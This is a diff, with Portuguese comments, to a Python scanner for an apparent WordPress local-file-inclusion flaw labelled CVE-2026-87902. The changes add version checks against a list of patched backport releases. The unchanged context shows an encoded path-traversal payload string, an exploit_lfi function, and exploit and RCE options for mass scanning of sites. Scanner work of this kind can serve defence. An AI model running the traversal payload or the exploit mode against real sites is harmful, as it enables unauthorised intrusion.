@@ -51,8 +51,16 @@ TRAVERSAL = "templates%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F"
 PROBE_FILE = "index"          # alvo da sonda (wp-content/index.php vazio)
 NONEXISTENT = "index-cve-check-nonexistent"
 
+# Versoes vulneraveis (fontes: Wordfence PSA, Hadrian, NVD/GHSA-7hp8-65ch-5whp):
+# todas as versoes do WordPress core de 4.7.0 ate 7.1.1 (inclusive).
 VULN_VERSION_RANGE = ("4.7.0", "7.1.1")
-FIXED_VERSION = "7.1.2"
+
+# Versoes corrigidas: 7.1.2 (branch atual) e os backports de seguranca
+# lancados para as branches de suporte mais antigas.
+FIXED_VERSIONS = ("7.1.2", "6.8.11", "6.7.3", "6.6.4", "6.5.7", "6.4.7",
+                  "6.3.8", "6.2.9", "6.1.10", "6.0.10", "5.9.11", "5.8.11",
+                  "5.7.13", "5.6.14", "5.5.15", "5.4.16", "5.3.18", "5.2.20",
+                  "5.1.19", "5.0.22", "4.9.26", "4.8.25", "4.7.28")
 
 # Explotacao conclusiva: wp-login.php existe em toda instalacao WordPress e,
 # incluido via traversal, renderiza o formulario de login na URL da pagina
@@ -404,6 +412,26 @@ def exploit_lfi(base: str, page_id: int, session: requests.Session) -> dict:
             "wp_config_executado": False}
 
 
+def version_tuple(v: str) -> tuple:
+    return tuple(int(p) for p in v.split("."))
+
+
+def assess_version(version: str) -> str | None:
+    """
+    Avalia a versao declarada contra o intervalo vulneravel e os backports
+    corrigidos. Retorna um sinal textual ou None se a versao for desconhecida.
+    """
+    try:
+        v = version_tuple(version)
+    except ValueError:
+        return None
+    if v in map(version_tuple, FIXED_VERSIONS):
+        return "versao corrigida (patch/backport aplicado)"
+    if version_tuple(VULN_VERSION_RANGE[0]) <= v <= version_tuple(VULN_VERSION_RANGE[1]):
+        return "versao DENTRO do intervalo vulneravel (4.7.0–7.1.1)"
+    return "versao fora do intervalo vulneravel"
+
+
 def scan_site(raw_url: str, exploit: bool = False, rce: bool = False) -> dict:
     result = {"site": raw_url, "wordpress": False, "versao": None,
               "status_cve_2026_87902": "N/A", "detalhe": "",
@@ -428,7 +456,10 @@ def scan_site(raw_url: str, exploit: bool = False, rce: bool = False) -> dict:
 
     if wp["version"]:
         # sinal adicional baseado em versao declarada
-        print(f"    [i] WordPress {wp['version']} declarado em {raw_url}")
+        sinal = assess_version(wp["version"])
+        print(f"    [i] WordPress {wp['version']} declarado em {raw_url}"
+              + (f" — {sinal}" if sinal else ""))
+        result["sinal_versao"] = sinal
 
     page_id = find_valid_page_id(base, session)
     theme = probe_theme_page_dir(base, session)
@@ -517,9 +548,10 @@ def main():
     if not sites:
         sys.exit("Lista vazia.")
 
+    fixed_list = ", ".join(FIXED_VERSIONS[:4]) + ", ..."
     print(f"[*] Escaneando {len(sites)} site(s) para CVE-2026-87902 "
           f"(afeta WP {VULN_VERSION_RANGE[0]}–{VULN_VERSION_RANGE[1]}, "
-          f"corrigido em {FIXED_VERSION})\n")
+          f"corrigido em: {fixed_list})\n")
 
     results = []
     with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
